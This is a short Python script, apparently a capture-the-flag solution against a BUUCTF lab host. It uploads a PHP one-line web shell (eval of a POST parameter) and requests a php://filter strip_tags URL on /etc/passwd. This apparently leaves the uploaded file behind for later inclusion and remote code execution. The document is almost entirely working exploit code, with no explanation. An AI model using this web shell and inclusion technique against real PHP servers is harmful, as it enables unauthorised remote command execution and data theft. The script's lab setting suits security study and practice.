import requests
from io import BytesIO
import re
payload = "<?php eval($_POST[l]);?>"
file_data={
   'file': BytesIO(payload.encode())
}
url="http://ff3e321d-e9c7-45ee-8824-21b62dbcc8c4.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
try:
   r=requests.post(url=url,files=file_data,allow_redirects=False)
except:
        print(1)

#print(session)